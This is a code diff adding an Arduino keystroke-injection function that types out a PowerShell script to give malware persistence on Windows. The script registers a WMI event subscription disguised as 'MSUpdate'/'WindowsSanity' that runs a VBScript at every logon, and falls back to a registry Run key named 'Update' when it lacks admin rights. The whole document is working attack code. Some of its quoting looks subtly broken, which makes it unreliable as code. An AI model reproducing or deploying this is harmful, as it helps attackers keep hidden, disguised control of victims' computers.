@@ -1,0 +1,42 @@
+void persist(String filename)
+{
+    Keyboard.print("echo $cp = New-Object Security.Principal.WindowsPrincipal( [Security.Principal.WindowsIdentity]::GetCurrent()) >> %temp%\\\");
+    Keyboard.print(filename);
+    Keyboard.println(".ps1");
+    Keyboard.print("echo if($cp.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -eq $true) { >> %temp%\\\");
+    Keyboard.print(filename);
+    Keyboard.println(".ps1");
+    Keyboard.print("echo $fns = \"root\\\cimv2\" >> %temp%\\\");
+    Keyboard.print(filename);
+    Keyboard.println(".ps1");
+    Keyboard.print("echo $wns = \"root\\\subscription\" >> %temp%\\\");
+    Keyboard.print(filename);
+    Keyboard.println(".ps1");
+    Keyboard.print("echo $qy = \"Select * from __InstanceCreationEvent within 30 where targetInstance isa 'Win32_LogonSession'\" >> %temp%\\\");
+    Keyboard.print(filename);
+    Keyboard.println(".ps1");
+    Keyboard.print("echo $fn = \"MSUpdate\" >> %temp%\\\");
+    Keyboard.print(filename);
+    Keyboard.println(".ps1");
+    Keyboard.print("echo $fp = Set-WmiInstance -Class __EventFilter -Namespace $wns -Arguments @{name=$fn; EventNameSpace=$fns; QueryLanguage=\"WQL\"; Query=$qy} >> %temp%\\\");
+    Keyboard.print(filename);
+    Keyboard.println(".ps1");
+    Keyboard.print("echo $cp = Set-WmiInstance -Class ActiveScriptEventConsumer -Namespace $wns -Arguments @{name=\"WindowsSanity\"; ScriptFileName=\"$env:TEMP\\\");
+    Keyboard.print(filename);
+    Keyboard.print(".vbs\" >> %temp%\\\");
+    Keyboard.print("; ScriptingEngine=\"VBScript\"} >> %temp%\\\");
+    Keyboard.print(filename);
+    Keyboard.println(".ps1");
+    Keyboard.print("echo Set-WmiInstance -Class __FilterToConsumerBinding -Namespace $wns -arguments @{Filter=$fp; Consumer=$cp} ^|  out-null } >> %temp%\\\");
+    Keyboard.print(filename);
+    Keyboard.println(".ps1");
+    Keyboard.print("echo else {New-ItemProperty -Path HKCU:Software\\\Microsoft\\\Windows\\\CurrentVersion\\\Run\\\ -Name Update -PropertyType String -Value \"$env:TEMP\\\");
+    Keyboard.print(filename);
+    Keyboard.print(".vbs\"");
+    Keyboard.print("-force } >> %temp%\\\");
+    Keyboard.print(filename);
+    Keyboard.println(".ps1");
+
+
+
+}
